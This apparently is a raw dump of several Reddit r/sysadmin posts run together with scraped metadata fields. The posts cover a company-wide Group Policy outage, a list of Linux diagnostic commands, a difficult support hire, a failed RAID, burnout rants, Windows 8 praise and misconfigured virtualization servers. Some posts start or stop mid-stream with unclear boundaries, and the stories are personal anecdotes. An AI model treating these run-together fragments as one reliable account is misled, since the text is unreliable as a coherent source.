My theory still stands that there was at least one disgruntled employee and did some nefarious acts to sabotage the network.  I have offered up my IT skills to the Enterprise Ops team and my director is vetting me to let me help them.  As chaotic as it is, I doubt they'll accept my offer.  

I have also accepted the fact that I will probably not hear about the true cause of the incident.  NDA's are quite common and frequent here.  Hell, I think I signed over a dozen in the last year for various things.  

Worry not, if I do find out, I'll update the post.

------------------


Let me preface this incident with the fact that I stepped out of being a sysadmin (over 9 years) to pursue IT R&amp;D for a large company.

So, on Monday morning (last week), I get to work at 6AM and log into my workstation and fire up Outlook to see what BS came in over the weekend.  While Outlook is chugging away, I reboot about 120 development servers (VM's) which auto-log in with an AD account with non-admin rights.  This is standard procedures after a weekend of updates and patches from the developers.  This is done manually unless the development team says otherwise.  I tell Nagios to ignore those servers for 15 minutes.

A few minutes later I noticed an email from the AD team of my company that came in at 5:45AM that morning:

&gt; Due to a Group Policy *mis-configuration*, Network Interface Cards have been disabled.  Please use another workstation/server until the matter has been resolved.

wut?!

I checked my Windows workstation... NIC is disabled.  Poop sticks.

As I am poking around my workstation to fix the NIC issue (needs local admin credentials), 15 minutes has passed unknown to me and my cell phone dings that I have a new text message... 120 of them.  It chokes my phone as each one slowly trickles in.  I go into Nagios and disable alerting on all dev and QA boxes and left the production monitoring normal.

My colleagues are now starting to come into the office and logging into their workstations and other servers... some servers are production boxes...

Nagios is now alerting that Exchange, SharePoint and hundreds of servers are all not pinging back.  A colleague, SSH'es into the Nagios box and checks the SMTP queue...  
&gt;""someone done F&amp;^%'ed up...""

Queue panic and ass sweating...

By 8AM, the damage has been done.  Any Windows based OS has been effectively shut down from the network perspective.

I gather my team into a conference room and start to figure out what to do next.  One of my team members noted that the ""fix"" from the AD team was the worst idea ever... apparently the GPO, though revoked, is still lingering out there and now the general population users are now hosing their own workstations.  Our receptionist comes into the conference room (which now reeks of burnt coffee and cigarette smoke - majority of us smoke) and says that every workstation she logs into drops the NIC.

Being an admin for over 9 years, this kind of cock up is terrifying.  I can only imagine the ""oh shit!""  person who not only set the GPO that way, but the person who APPROVED the GPO... Change Management/Process is something that was beaten into me in my last job.  CYA...

I have a few contacts in the main system administrator group and got in contact with a few of the techs...  here is a breakdown of the damage:

-  7200+ desktops affected in the US
-  1000+ desktops affected worldwide.
-  3100+ development and QA servers affected (90% being VM's)
-  18 Exchange servers
-  42 SharePoint servers (large farm)
-  29 facilities affected

My facility is small with about 20 employees and 80+ servers in our basement datacenter.  We got a canned voicemail from the Operations team to sit tight and an hourly phone update will come out.  The message also noted to physically turn off any and all Windows based workstations and servers until further notice and no one under any circumstances was allowed to log into any Windows machines.  

  We were told we could NOT work from home or not come in at all - if we did, we had to use PTO time :(  Between Monday and the ""fix""we brought in some PS3's and Xbox360's and used the flat screens in our lobby to play some games.

Friday rolls around and 20 techs show up at my door to fix the issue...  

Reboot into safe-mode, login as local admin and run a script already located on the local system.  

It is now Sunday and half of the downed systems are back up according to my contact on the admin team.  The worst part was that not only was the GPO pushed to USERS, but to COMPUTER accounts at the same time.  


-------------

So the lesson here is that major changes to networks like that need to go through a vetting process:  Discussion, testing, testing, approval, execution.  Lucky for my company, with each update/patch/policy change, they have to put in an ""undo"" script on each local machine.  Apparently, each update package is pushed to the local machine and executed via command or GPO.  To undo something, a local admin has to run ""ctrlz######.bat"" where '#' corresponds to the patch # that was applied.

I got a chuckle out of the file name :3

This week I felt glad NOT to be a sysadmin, but at the same time I truly miss it.

I can honestly say that, for me, being a sysadmin is not only one of the best jobs in IT but one of the best office jobs that you can have period.   I’ve always thought that most sysadmins would make great mechanics if they had just got working on engines instead of computers.  The understanding required, the troubleshooting involved and the skills and tools needed for maintenance and repair are almost exactly translatable.  If you think about it, we’re undercover blue collar workers; we carry the trappings of office workers but we all know that we’re down in the trenches, shovelling coal, wrenching the engines and keeping the ship moving forward at all costs. 

So what if we all don’t get paid what we think what we deserve.  So what if we don’t have enough zeros on the end of our budget.  Do you enjoy it?  That’s the question you have to ask yourself.  I love the challenge of creating an enterprise level IT infrastructure with a yearly budget that’s less than the cost of an entry-level SAN.  I get to investigate, I get to improve, I get to innovate and I get to implement.  I doubt most of our cubicle mates are so lucky in their daily activities.  One minute I’m carrying a 60 lb. printer up a flight of steps and the next minute I’m cloning a new virtual machine.  This is fucking awesome!

I think my users are awesome and I’m pretty sure they think the same thing of me.  I get to be their hero on a daily basis.  I enjoy the challenges that they present to me and I’m more than happy to help come up with solutions to their problems.  Without them I wouldn’t have such a kick ass job.  I don’t care if I have to figure out why their facebook page isn’t loading up properly, if that’s what it takes to keep them happy and saying good things about me then it’s my pleasure to do it.  More than once a simple annoyance has pointed towards a much deeper problem that I was able to fix before it became a real issue.  More than once I’ve been bought beers after work because I’ve saved the day.

I just wanted to put together a list of checks you can perform on a linux server to try and figure out why it keeps going down. Please help and i'll edit my list with your submissions. Thanks!

# **Disk Space:**
    df -h
(Make sure you have enough disk space)


# **Memory:**
    free -m
(Check you're not out of memory)


# **Processes / Load average**
    top (shift + m)
    htop
(Check for processes that are taking up a lot of memory/CPU)


# **Apache errors**
    cat /var/log/apache2/error.log
(Look for 500 errors caused by erroneous code on the server)


# **High hit rate**

    grep MaxClients /var/log/apache2/error.log
(Check for MaxClients warningdamn
 in your apache error logs)

    tail -f /var/log/apache2/access.log
(Check for bots/spiders) [You might need to lower your MaxClients settings]

# **Check recent logs**
    ls -lrt /var/log/
(the -lrt flag will show you the most recently modified files at the end)

# **Check your cronjobs**
    ls -la /var/spool/cron/*
    ls -la /etc/cron*
(You might find your server is going down at a certain time, this could be result of 
a cronjob eating up too many resources)

# **Check Kernel Messages**
    dmesg

# **Check inodes**
    df -i
(Check inodes remaining when you have a disk that looks full but is reporting free space)

# **Install Systat for collective stats (cpu, i/o, memory, networking)**

I've been through dot-coms, commercial companies, consulting gigs, startups and defense / government contractors and the one thing I've realized is just how little we have known and how ""seat of the pants"" everything has been and how just now, we're starting to get heads on our shoulders and starting to solve problems that really matter to our business.

I don't want to tell you what you need to now or how to run your business, but I do hope you will go out and discover that for yourself. Go read some books, go participate in conferences, learn to be a speaker yourself, choose something and get good at it, damn good at it. Don't sit around and let the world boss you around, don't sit around and taking shitty jobs and deal with it, do something for yourself and take charge.

Move if you have to, take risks if you have to.  If you're burning out, its because YOU are burning out, the world nor IT is doing that too you, you're only doing it to yourself.

Once you realize you do have the ability to make a difference, the balls to make a difference and the knowledge to make a difference, IT is just the beginning of what you can achieve.

Hell no, i'm not quitting. I'm just getting started.  Automate all the things, Work on continuous delivery, work on continuous integration, practice, practice, practice.  Expect failure but reward success, optimize your work, optimize your processes.  Use change management to enable your controls and audit requirements while at the same time documenting how work GETS done, now how it STOPS getting done.

Think outside the box, ask questions, network, network, network. Talk to peers, network, get out and meet people, network, write a blog, network network NETWORK.

Learn something new, give up your biases, get open minded.

The best advice anyone every gave me and that I've been able to re-confirm through reading some great books is to stop thinking like an asshole and start thinking like a scientist and someone who cares.

IT is only what YOU make of it. The same goes for ANY job, ANY career.

Hell, I even find myself burned out and ready to pack it up after a vacation. We're only human.

It's not about the OS, hardware, platforms or services you use, its about YOU and how YOU choose to use what YOU have.",,False,self,t5_2qnp7,False,,,True,t3_1fp599,http://www.reddit.com/r/sysadmin/comments/1fp599/im_not_leaving_it_all_behind/,

1370547317.0,306,self.sysadmin,1ft83r,Tales from my support guy.,372,66,328,http://www.reddit.com/r/sysadmin/comments/1ft83r/tales_from_my_support_guy/,"Thought you guys would enjoy this.  We hired this guy a few months back. I'm the sysadmin and he's supposed to be my support guy. Its an entry-level role. During the interview he was super cool and once he started he became a demanding jerk. He'd criticize all the infrastructure, demand root passwords, tell us to replace our apps and servers with things he can make in MS Access, and other Dunning-Kruger fuckwitery. 

**Week 1**:  User says computer is slow. Aaron rushes into my cube and tells me it must be the ""CPU bandwidth"" on these models. He claims its bad. He wants to know where he can get a new computer for this guy.  The computer is an 18 month old i5. I tell Aaron its not the hardware and I'll look into it.  Turns out one single application was running kinda sorta slow.

He's also crazy chatty and interrupts me every hour to talk about cars, girls, etc usually loudly (he cant control his volume of voice usually) and says sexist things. We sit next to about 10 women who can hear us.  He even called someone on TV ""super hot"" loudly and the girls next to us laughed. No joke, this was 5 minutes before a mandatory sexual harassment seminar. One girl yelled ""In 5 minutes we'll find out if that comment is sexist or not"" to him over the cube wall.  He didn't notice because his motormouth was running so quickly.  

He starts hinting at how we can pirate software. I keep telling him we have money here and we don't violate licenses. I give him this speech weekly until he shuts up.

**Week 2**:  User is complaining about IE. I forward him the email and to look into it.  He reboots the computer and tells me he's out of ideas. I explain to him how to clear out a cache, cookies, etc. He claims he knew that, but he thinks its the ethernet cable. Anytime something is having issues, its always the ethernet cable he claims. I'm so sick of hearing that.  Everything I recommend is ignored and he does this cargo-cult troubleshooting of blaming the same 2 or 3 things. He never checks the event log or anything. I'm not even sure he knows what it is.  I showed it to him and he just ignored me.

**Week 3**:  He walks in the server room and complains about the UPS.  Without knowing my load, wattage, etc he freaks out and tells the VP of IT that we need to replace it ASAP and I don't know what I'm doing.  He says he can tell by looking at it, that its too old and small.  I have literally 5 physical machines in the server room now. He claims I should have at least 8U's of batteries maybe 16. I tell him I'm good, thanks and the servers will shutdown when power is out.  He says batteries that get old have less capacity and I have at best 10 seconds now.  This is all from his crazy brain. He has no stats or evidence. Just gut feelings.  

**Week 4**: He demands to clean up the mess of equipment in the server room. I tell him we need to recycle all the old computers in there first. Instead he gets permission from the VP directly behind my back and does it. He spent 5 hours moving things that belong in the garbage. Now everything is neatly put into unlabeled boxes and the old equipment is mixed with the new. I have no idea how to find anything now and recycling will be a PITA because I have undo what he did to get that equipment out of there.

**Week 5**:  He tells me he doesnt believe in making tickets. He thinks they're passive aggressive and the users will hate him.  I tell him its policy.  I have to remind him everyday to make tickets. He prefers to keep everything secret.  He also tells me he doesn't trust images or imaging and he wants to make every computer using the windows disc from scratch.  Everytime a computer has an issue he says ""I think its your images"" that is, if its not the ethernet cable. I'm so fucking sick of that.

**Week 6**: He sees me working on a outage issue at our data center via a ssh session, and starts barking wrong linux commands at me to type into the console (i was using solaris).  I tell him i dont need his help and he practically demands the root password so he can take a look.  He literally has only desktop experience and now wants to tackle the back-end. later he claims he could  replace our 10+ server data center which runs dozens of custom web apps with ""one wordpress.com"" site that he could configure by himself. I end up talking to the VP about how its not his job to touch the servers and having him demand passwords.

**Week 7**:  I give him a task, which he accepts in front of the VP. VP walks away and he refuses the task and that we should share it. He gives me a long speech about how he's not really a support guy but my ""partner"" and how we should share all our responsibilities. I argue and explain that isn't remotely true and that we created this position to take desktop support off my back. He gives me an insane rant that ends with him threatening to quit or report me to HR. Another awkward attempt to get domain admin and root passwords from me.  Another talk with the VP.

**Week 8**: I guess the VP talked to him, re-read him his job description, pointed out all these things he's doing wrong, told him to stop asking me for access to things, and now he utterly refuses to talk to me unless absolutely needed. Silent treatment.  He thinks he's being tough, but honestly I'm so happy he's stopped talking to me. Its been so nice!!!  Now we communicate via emails our VP is always copied on.  I also enjoy that too.  I love paper trails and accountability.  


**Week 10**: Two weeks of the silent treatment. I'm still loving it.  Maybe he'll quit soon.



edit: grammar, clarifications, etc

edit2: Some others I almost forgot about

* Since he's started he's managed to infect his computer twice. TWICE!!

* He refuses to use the built-in gotomeeting recording option. Instead he's going to use 3-rd party screen capture software because ""its HD.""  I then asked him how he's going to record the audio. He looks confused and then he goes ""Oh i'll use a microphone or something."" He was going to record a webinar without sound.

* A spam email came in and he demanded I send out a all-staff email warning them about it. I said no. he then calls me rude.  Apparently, 5 or 6 people got it. He says the spam was a serious virus. I asked him how he knew that. I asked him if he clicked on it. He said ""no, i'd get infected that way!!!"" Ye olde catch-22!!  I told him next time just forward it to me and ill open it in linux. Then he started going around telling people to mark the email as spam in outlook. I took him into an office and explained to him how we dont use outlook's anti-spam, we use postini. I give him a postini tutorial and he just snaps at me how stupid postini is and how Outlook is better and he's genuinely angry I'm not using it or switching to it. I have no idea how to respond to him.

*  We were discussing a difficult end user experience he had and I said ""shes kinda bipolar, nice some days, bad other days, don't take it personally"" then he makes this very somber face, does a dramatic pause, looks at me, and asks ""Do you think I'm bipolar?"" I didn't know what to say. I said ""no no, of course not"" but I was thinking ""boy you fucking crazy.""

1355946565.0,290,self.sysadmin,154hsy,Learn Linux The Hard Way (β version),363,73,122,http://www.reddit.com/r/sysadmin/comments/154hsy/learn_linux_the_hard_way_β_version/,"About 6 months ago I posted here about my introductory guide to Linux, which was half finished by then. Looking through server logs I found that my guide is still visited by people, and so is hopefully useful for some of you folks.

Well, I completed it, there still are some errors but the guide is fully written by now. I'll quote parts of my introductory page here:

**Introduction**

This is a simple guide written in “Learn X the hard way” style, author of which is Zed A. Shaw. The purpose of it is to give you some experience in working with Unix-like system. There are many good UNIX-Like systems out there, for example FreeBSD, OpenBSD, OpenSolaris and even MAC OS X, just to name a few. When deciding which system to use in this guide I chose Linux mainly because it is most popular UNIX-like server operating system, which means what you have much bigger chance encountering it in the wild in comparsion to other UNIX derivatives. And Linux-related skills are relatively easy transferable to other UNIX-likes.

Now I want to tell you about the details. You will encounter many detailed tables containing lists of many fields. You may think you do not need most of this information, but what I am trying to do here is to teach you the right way to approach all this scary data. And this right way is to interpret this data as mathematical formulas, where every single symbol has its meaning.

The bottom line is, know your stuff. Pay attention to details. Understand that every piece of data on the screen has its meaning, and is called a field for a reason and do not dismiss something because finding what it does is hard. 

But there is an other extreme, so remember it is usually better to just practice more instead of trying to make every little thing perfect. So, if something does not make sense now and you already spent a decent amount of time researching it, sometimes it is better to write this down somewhere and return to this later, or just ask a guy who knows it, but try to understand what it does on your own first. Chances are, if you were studying even a little in the time being, you will understand that one hard part much easier.

Bottom line. Know your stuff, pay attention to details, but don't let yourself become stranded.

**Audience**

* Aspiring system administrators who are interested in UNIX-like systems.
* Programmers, because a good programmer should know now to manage the system he is programming for.
* People who want to try something new and to understand what this “UNIX way” is all about.

**Prerequisites**

* Familiarity with command line interface is recommended. You can get familiar with it by completing The Command Line Crash Course by Zed A. Shaw.
* Basic knowledge about operating systems in general will be a plus.
* Basic knowledge about networking will be a plus.

**How to work with this guide**

* Read introduction for each exercise. You may skip hard parts and return to them later.
* Type in exactly what is shown. No copy-paste is allowed.
* Compare your output with “What you should see” section.
* Read the explanation.
* Do the extra credit. Here you may skip hard parts and return to them later as well.
* Read manuals for commands you type. Reading descriptions will suffice.
* Do not rash! If you will try to complete this guide at once, it will not do you any good. One exercise a day is a perfectly reasonable pace.

**To complete this tasks you need the following**

* A computer with Internet connection.
* A bit of spare time.

And so, I give you my guide in hope that you will find it usefull: http://nixsrv.com/llthw

**P.S.**
If you will have any questions, even ones which you think are stupid, don't hesitate to ask right away in the comment section. Remember, ""I don't understand"" is a very good question to ask irrelevantly of your power level :)


**TL;DR**
Do not know Linux? Familiar superficially and want to become better at it? **READ. THIS. THROUGH.**

I'm the 2nd backup sysadmin, the lead guys are gone this week. Apple Xsan and Promise RAIDs. http://i.imgur.com/gSnKADO.png

Logs point to nothing, though the shutdown might have been incorrectly performed. I'm just stunned, taking a break for lunch. I don't think there's a path to recovery from this point.

EDIT: Thanks for the good suggestions. I tried several, as I was waiting to find out if we had a service contract. We do, so I'm putting a call in.

EDIT 2: Reached vendor support, supplied logs to them. Turns out the RAID was hosed last Thursday, when the expansion was shut down before the head unit, causing the head to mark most of those drives dead. Which is odd, because the RAID was up on Friday when it was shut down again in the wrong order. (I was out Thursday and Friday.) Everything I've tried since powering up this morning had no chance of succeeding. I'm awaiting a call back from the vendor, but there are other confounding concerns (out of date firmware, etc) so I'm not optimistic. Backups exist, I'm not keen on rebuilding and restoring without the other admins' input, but our project is halted without this data. *this is why they call it work*

EDIT 3: done for the night, nothing works, going home to drink, will make decisions tomorrow. I appreciate yall's keeping my spirits up.

EDIT 4: 29 hours later (zombies! no.) I have no working solution to bring the RAID back to life with the data intact. I have a 3TB drive mounted at the SAN's volume point. That lets us do some data collection and minimal processing using one Xserve in the rack. An extremely minimal restore will let us get through this week. The work we do can be easily integrated from the temp 3TB into the SAN (whenever that revives or is rebuilt) and into our backups. Next week we will have more staff on hand to decide and implement a permanent solution.

**Lessons learned**:

   * checklists for sysadmin tasks need more details
   * our backups work (we knew that, but it's nice to list something positive)
   * information on S/Ns, warrantees etc. in logbooks need to be updated
   * log files need to be reviewed more closely
   * don't be first in the day after the quarterly shutdown
   * inaction usually doesn't exacerbate our problem(s), **think** on it
   * it may be less costly these days to outsource the storage
   * could be worse, at least the fire suppression didn't go off

**FINAL EDIT** : 4 hours of vendor support later, all data is back, life is good. Probably would've been back in 2 hours, but one array had a disk in an unsteady state. Only one physical disk had to be rebuilt in one logical disk. If I had jumped on the phone earlier, this might have been fixed yesterday. Am running data checks tonight, and we should be able to operate 100% tomorrow. Gonna sleep good tonight.

He's convinced that antivirus vendors are the main culprits producing viruses in order to sell more product and has decided not to approve my renewal request.

My task now is to monitor the network for infections and compile a report on what is infecting whose machines, and if possible where it came from.  I'm to do this for the next 6 months.

Does anyone have any advice on how to minimize the risks? I realize that if we don't get infected then his POV will be vindicated and I'll look like an idiot for wanting to keep the AV.

I am a ""IT Systems Infrastructure Architect"", or at least that's what my business card says. I have been to school for many years and I have many pieces of paper hanging on the wall and I have many years of experience. I now essentially offer my experience, advice, and designs to our clients. 

The projects that I work on range from $80k-12m. Ultimately the amount of budget that I work with can be manipulated, but for the most part, is the result of an executive decision of our clients. 

If you are my client and said that you have $10m to spend on IT and that you want a complete 'IT Solution in a Box', I would build you a datacenter and some servers and get some support contracts for you to provide ongoing maintenance, support, upgrades, and end-of-life support. If you say that you had $20k, I would get you some servers and some FOSS licensing and you would probably end up with a part-time tier-2 network administrator doing ongoing support. 

The point is, from my perspective, all of IT used to be perceived as a cost center. If there was a ""problem"" with the way business was operating (such as 'we can't get email. we need an email server'), then the IT staff would build an email server and deploy email services. This ""problem/spend-money/resolution"" thinking is old and outdated. IT is not a cost center, at least not anymore. 

IT is now an insurance center. With the advent of all the cloud providers offering outsourced (everything), there really is a choice between dollars-per-month-per-user services, on premise services, colocation services, etc... 

However, with all of the different IT service models, the business model that fits best is an insurance center. If you have a problem with an inability to receive email, there are many ways that IT can solve this for you. We can build a complete new array of data centers with geographic redundancy and hosting in tier 4 data centers. We could subscribe to google hosted services and utilize their infrastructure at a markup. We could utilize existing virtualization resource pools (or create new pools) to drive services for the business. Whatever path makes sense for your business is the path you should choose. The route we choose to solve this problem is not the point of this post. 

What (at least I don't think) is a choice for you anymore, is to realize that IT as a whole is no longer a cost center, but an insurance center. With any of the options above in how to deal with email, there are a number of different paths that you could take to solve the situation. There are many different layers and types of redundancy and business efficiency that all come with different cost models, different liabilities, and different business forces driving implementation. 

However, the one thing that is constant, is that ultimately, as practitioners of IT, it is our responsibility to make both efficient and informed use of the dollars given to us. We just need to find better ways of informing the business centers that we can provide a number of different solutions, from 'just enough to drive legally' to 'enough insurance for a fleet of vehicles on several continents that is simply impossible to take offline'. 

IT is an insurance center, and we build insurance policies. ",,False,self,t5_2qnp7,False,,,True,t3_1ghxxq,http://www.reddit.com/r/sysadmin/comments/1ghxxq/it_as_an_insurance_center_not_a_cost_center/,

EDIT2: Wow, what a wonderfully cathartic experience.  I must've been awfully crabby when I posted this so a few people really missed what I was getting after, but most of you got it.  When I said ""hit the floor"" I was half talking out of my ass and half serious, anything that ""hits the floor"" would be very calculated and done with a very specific lesson in mind, after all, I have to clean the shit up off the floor so I wouldn't want a big mess.


One last statement on IT before I ride off into the sunset, I have the incredible luxury of building a department from scratch, and I mean SCRATCH.  No preexisting notions about IT, no experience with it etc. so when I make a claim like ""everyone will be treated equally"" I mean it.  I'm not trying to change the world, but I do have control over most of my own environment.

**UPDATE: [Part 2](http://www.reddit.com/r/sysadmin/comments/16bsub/so_i_left_heres_how_it_went_down/)**

**TL;DR = I hate my role as the 1 man IT department and feel I'm overworked, and none of my pleas for help (people or tech) go answered for over a year.  I'm burnt out and my new 'manager' knows nothing about tech, or IT/support roles, and is doubting I do anything because there are still some open tickets for ongoing projects.  Do I rage quit? or bite down and play nice and 'man up'?**

And the full rant... 

I'm so pissed right now and my apologies if that comes out here.  I'm going to try and lay this out here in a way avoiding ID of me or my current employer.

I am the Network and Systems Admin for the company in title but in practice I am the one man IT department.  When I took the job, I knew I was getting into that role and with the size of the company it was quite manageable.  The company has now doubled, if not nearly trippled in size (including merging with another small company) and now spreads over MULTIPLE offices around the midwest US, and overseas sales staff that are operating on all time zones pretty much.

I am on-call 24/7.  Literally.  I am the only one and they all have my direct cell and while I accept 'mission critical' calls are par for the course, I get the ""my printer is beeping at me"" calls at 3:20 am just the same.

I manage everything from reloading printer paper at the office I am based in, to troubleshooting phone lines, over the phone, with people who don't know the difference between a busy tone and a dialtone, across the country.  I also manage the Cisco and HP network devices, and am expected to administer multiple Linux boxes running KVM, with multiple (too many sometimes) KMV guests.  

I am expected to document everything.  I do not feel shocked at that expectation as it's good practice for everything IT, but... I am expected to document everything I do, as I do it (get to that in a second), as well as retro actively document the 5+ years of things they've set up before I was even hired!  I am also expected to document it in such a way that ""anyone in the company can open a PDF and do what you do.""  Basically a how-to for everything, up to and including (this was a real request), configuring a Cisco ASA firewall... written for someone who doesn't even know how to ssh or what a firewall is.  Back to the ""at the time you do it"" rule.  I am often doing MULTIPLE tasks at once and rarely ever get more than 15 minutes straight without someone dragging me into another discussion that probably shouldn't even involve me, but hey, it involves a computer or a file so... IT right?  I rarely get the time to go back and close out the ticket I just completed work on, before I am dragged away to another thing... and I rarely get the chance to open, fill out, and then close a ticket, for many of the things (most things) when people just walk up to my desk (the front of the whole office so everyone can get to me instantly), give me a problem, and need a resolution right then and there.

On that... I'm at the front of the office.  For fuck's sake.  The UPS guy has ME sign for everything and asks me if we have shit to pick up.  Fedex too.  Postoffice dude comes in, drops mail on my desk, goes out.  I'm closer to the front door than the people who answer the phones, deal with mail, and UPS/FedEx.  This not an issue for anyone it seems.

I have been with the company over a year now, as the only IT person.  The only assistance offered is whatever lowly 'intern' they have hired to help with 'random office things' for that period of time.  For that persons time though, I have to queue up along with everyone else in the office who wants assistance answering phones or filing paper or scheduling meetings for them so they dont have to.  These people also NEVER have any IT skills, so all I can have them do if I get time with them is tell them to update a spread sheet with numbers (file sizes) they find on various network drives.  That's all.

I have personally installed 2 full racks in 2 locations for them with servers, NAS, network, VPN, spares, etc.  I am the only person with access to 1 of those which is 2 hours away from my home office, and no one else is willing to get access so that if anything ever happens, I  alone have to drive to the datacenter to flip a switch or console into a server when a dev turns eth0 off.

We also deal with media quite a bit, and we have multiple people who are geniuses with Adobe products.  I am tasked with managing all of the 'licenses' (very very grey area in some cases, if not just pirated), and the workstations they run on.  I am also tasked with keeping a 40TB Netapp from being full.  38TB they need to retain there ""just in case"".  So I am constantly copying 2TB off to external drives for off-site storage, and by the time I get it open for another project to fit on, they fill it back up and yell or open tickets ""NETAPP IS FULL!!! HORRIBLE DISASTER!! NO WORK CAN BE DONE!!!""  They refuse to buy more disk space for the netapp, or alternate large storage solutions for quicker offload of data.

Now, they have decided that I am using my time inefficiently, which I totally agree with.  I have no idea how to 'effeciently' keep up with the level of demands placed on me.  Their solution however is not to bring it another IT skilled person to balance the loads and work beside me, but to assign the office manager to be my boss because ""she's good at schedule everyone's time"".  ie: she makes the meeting calendar.

I have a ticketing system.  No one opened a ticket for the first 4 months it was up and running.  No one.  Everyone called me directly and no matter what I did they didn't get it.  Not until I had to tell the CEO to open a ticket 5 times in a call did he get the message and then make a note about it for everyone.  He still never opens tickets but that's what it is, he's the main man.  Now I get tickets for ""My mouse needs cleaning"", or ""Our site is giving php error code... ""  I am expected to clean mice balls, and replace mousepads, or hand them out.  I am expected also to apparently PROVE that a PHP error code in our products is NOT the fault of the Linux server it's running on, before I am allowed to have a dev look into it.  

Just tonight, sitting here installing a VM for our Oracle guy because he'd rather have a ""clean slate"" than upgrade his current VM's oracle with a patch... I have gotten an email telling me that I have failed to close all of my completed tickets in the past few weeks, and there is now reason to suspect I have spent 3 weeks doing nothing.

3 weeks, of a one man IT shop, doing nothing... the place would be burned down.  But, there's reason to doubt that I've been doing anything?  Really.

I emailed the CTO, my direct boss, who's been avoiding being ANYTHING of a manager to me for my entire time with the company up to the past few weeks, and who had repeatedly shot down requests for a) more IT help, b) more storage options, c) developers to look at site errors instead of me, d) meetings to keep us both on the same path with IT needs... I told him I need to know if HE personally has any reason to doubt my abilities and efforts, and if so HE needs to tell me, not this office manager (in an email she CC'd to him, the president, and the CEO, none of which have mentioned any concerns to me directly).

Oh and fucking vacation time.  I haven't had a vacation since I started. They have a ""strict, not strict"" vacation policy.  ""as long as work gets done when it needs to get done, take whatever vacation you need"".  There is no written policy.  No accumulated days.  No anything.  People just say ""I'm out from now til then.""  However, I am IT.  We are a tech company.  I am always on call.  There is always something relating to some type of technology that needs to be looked at.  The only 'vacations' I have gotten, is the drive time across the midwest to go from office to office now and then to work at differnet places for a week at a time.  Seriously, they consider that vacation, or 'personal time'.

I am fucking tired of this.  I'm tired.  I'm just fucking beat down by all of it.  I think most of the people in this company are fucking awesome and great at what they do, the other 1/3rd are all college friends that came along with the CEO when he made the place so they're untouchable and I'm just tired of getting slammed with multiple offices, remote users, everything from piddly shit to being the 1 person on high fucking alert during Sandy's landfall.  I'm just fucking tired.  I'm not personally invested in the company like my superiors are, and not guaranteed anything if they do sell, or we strike fucking industry gold or anything.  I'm just getting my paycheck (about 80k) and that's it.


I want to quit.  I want to clean out my fucking personal shit tonight, drive home, and fucking email them a ""good luck with that shit"" letter in the morning and never go back.  Okay, maybe hand them a formally typed letter and say ""sorry, it's just not working out."" in the morning and then go home, but what the fuck ever.  

Now, I ask you guys, from what I rambled here, does it sound like 1 IT person should be handling this kind of load on their own?  Does it sound like I'm just ""not realizing my true potential""?   Should I bit the fucking bullet and nod and play nice and wait for .. what?

I am already taking phone interviews, and look to get more when I bump my resumes.  Meant to do that this week actually but I have had to do lots of last minute ""we forgot to do this, could you look at it..."" shit for the DBA's and Dev's.  I am also at this point willing to work outside IT if it comes to that again.

I am just looking for someone to tell me that they've been here, done that, and it's not as bad as I think it is.  Or tell me what you've done to unravel situations like this in your past.  If no one can, then I'm probably in my last 12 hours of being part of this company.  And in that case, how do I deal with this going forward, eg resume?  Whats the best way to walk the fuck out (not staying for an awkward 2 weeks, fuck no)... and not cause it to bite me in the ass on my next interview?

Needless to say, I didn't do a thing this weekend apart from go to a bar with my friends. Which was rather handy as my company Blackberry was cut off by the carrier for lack of payment on the bill.

Lastly, I've just came into work this morning to a note saying I have to go to the data centre and design and build a four site remote network by lunchtime because they found a new client over the weekend and promised him they'd have his whole IT infrastructure done for him by Monday lunch time.

Still looking for jobs, but I'm looking damn hard.

* Unpaid overtime (24 hour on call status) until all the trouble tickets get cleared (usually around 100 new get logged per day - I manage to fix around 10 to 15 a day). So perpetual unpaid work.

I like Windows 8.

I've had it installed on my work laptop for about 3 months now. I've also used it on an two Asus tablets, and a Surface Pro. I like it, a lot.

Let's talk start button/interface. Once the shock of the new interface wears off, if you really take the time to learn to use the new options, it works quite well. In my opinion, if the loss of a start button to click on causes you such a huge problem you won't use the OS... well you sound more like one of my end users than a SysAdmin to me. Between win-X and just plain windows key -&gt; typing to search, I can launch damn near anything from my keyboard without ever touching the mouse. Every single thing people complain about (that I have heard) that is 'harder' to access now with a traditional keyboard/mouse: has a keyboard shortcut, or can be found and launched by hitting the windows key and typing the first few letters. Look up all the system shortcuts, they are wonderful for speeding up your workflows.

System performance. Boot times, and shutdown times, are way better, lag on login is way reduced. Driver and Thread isolation works very, very well on Windows 8. I've not seen a BSOD since the beta release. Sleep mode on my laptop *actually works reliably.* System rollbacks are much better. Multiple monitor support is better than ever as well.

Tools for admins. The server manager rocks. Seriously it does, try it, love it. Windows 8 with a Server 2012 Direct Access server is fantastic for us admins. The new AD tools are better than windows 7's. RDP works faster than on 7. The AD admin console is great. Actually useful file transfer dialog boxes, File History is a great personal backup tool, and a built in factory reset option if you get something really messed up.

All in all, Windows 8 is quite good, if you can put aside your initial distaste of the interface. Once you do, there is a very viable OS here. And, if you have it on a tablet, it's even better.",,False,self,t5_2qnp7,False,,,True,t3_1d30ad,http://www.reddit.com/r/sysadmin/comments/1d30ad/so_i_know_its_fashionable_to_hate_windows_8_but_i/,

Fixed, though!",273,29,110,http://www.reddit.com/r/sysadmin/comments/k12p9/trust_but_verify_spent_250000_on_new_servers_that/,"I instigated and am leading a virtualization project at my company, and after spending $250,000 on new hardware, benchmarks showed our application performance to be 50% slower than the 5-year-old hardware they are replacing.

There is no way virtualization overhead is that high; the old servers are Xeon 5100 and 5400s and the new servers are 5600s with higher clocks. For our workloads, these new guys should be 50% faster, if anything.

So I've been taking incredible flak the past two weeks, as the project was beginning to look like an abject failure. I've been hearing nothing but complaints about virtualization overhead; questions as to my intelligence, experience, and level of detail in planning; and mutterings about who might lose their job over an expensive debacle like this.

My job was on the line over this. 

But I simply couldn't believe such awful performance was possible, and pored over every setting and option in vCenter, every spec sheet, online benchmark results, switch configurations, everything. Everything looked kosher, but it just wasn't delivering.

Now, to make sure there were no installation mistakes, I had used our hardware vendor's consulting services since none of my staff are familiar with ESX or any of the new hardware. So I checked all of the consultants' configuration checklists and configuration documents, but found nothing amiss. The staff who had been supervising them also swore that everything was done according to spec.

So I yanked one of the servers and checked it myself: ""Trust, but verify.""

DID NOT MATCH THE SPEC SHEET.

Well, the hardware we purchased was all there, just set up all wrong. Apparently, this top hardware vendor (whose name rhymes with either Jell, Jewlett-Jackhard, or JBM) can't read their own spec sheets.

1. Memory was put in weird bank configurations that limited everything to 2-channel 800Mhz instead of 3-channel 1333MHz performance. The NUMA layout was all jacked up, too. Lots of remote access going on.

2. Xeon Turbo Boost was disabled.

